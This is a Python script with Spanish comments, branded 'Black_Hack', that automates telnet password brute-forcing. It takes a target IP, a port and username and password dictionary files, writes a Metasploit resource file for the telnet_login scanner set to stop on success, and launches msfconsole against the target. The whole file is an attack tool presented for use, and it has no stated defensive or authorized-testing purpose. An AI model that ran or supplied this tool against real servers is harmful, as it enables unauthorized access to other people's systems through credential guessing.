#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import time
import sys
import os
from io import open

# Programador David soto noche
# Correo: Sotodelanoche@gmail.com
# Lenguaje Python3 scrispt 
# Fecha 19:04:2020:
# Nombre del programa : ExploX_TelneT_BrtFor
# Accion: explotacion de servidores atraves de telnet MSF5

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet -k -f /root/telnetEXplo/user/font/cosmike "   		Smp_A" && figlet -k -f /root/telnetEXplo/user/font/bulbhead " ExploX_TelneT"')
print("			  	   Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:","1--seleccion ip Server y Configurar puerto","2--diccionario Name_user y diccionario Name_key" ,"3--explotacion", "4--exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def SERVIDOR():
	global ip_server
	global port
	while True:
		try:
			ip_server=input("Introduzca ip servidor: ")
			port=input("Introduzca puerto servidor: ")
			return ip_server, port
			break
		except TypeError:
			print("No es tipo de variable intetelo de nuevo")
def DICCIONARIOS():
	global ruta_dic_user
	global ruta_dic_key
	while True:
		try:	
			ruta_dic_user=input("Introduzca ruta diccionario usuario: ")
			ruta_dic_key=input("Introduzca ruta diccionario key: ")
			return ruta_dic_user, ruta_dic_key
		except TypeError:
			print("No es tipo de variable intetelo de nuevo")
def explotacion(ip_server,port,ruta_dic_user,ruta_dic_key):
	print("create file config")
	print(ip_server)
	print(port)
	print(ruta_dic_user)
	print(ruta_dic_key)
	time.sleep(1)
	file = open("user/create_date_exploid/exploid.rc","w")
	file.write('msfconsole'+'\n')
	file.write('use auxiliary/scanner/telnet/telnet_login'+'\n')
	file.write('set RHOSTS '+ip_server+'\n')
	file.write('set RPORT '+port+'\n')
	file.write('set USER_FILE '+ruta_dic_user+'\n')
	file.write('set PASS_FILE '+ruta_dic_key+'\n')
	file.write('set STOP_ON_SUCCESS true'+'\n')
	file.write('exploit'+'\n')
	time.sleep(1)
	os.system('x-terminal-emulator -e msfconsole -r user/create_date_exploid/exploid.rc')
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU DE EJECUCION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		SERVIDOR()
	elif (key==2):
		DICCIONARIOS()
	elif (key==3):		
		explotacion(ip_server,port,ruta_dic_user,ruta_dic_key)
	elif (key==4):		
		exit=True	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$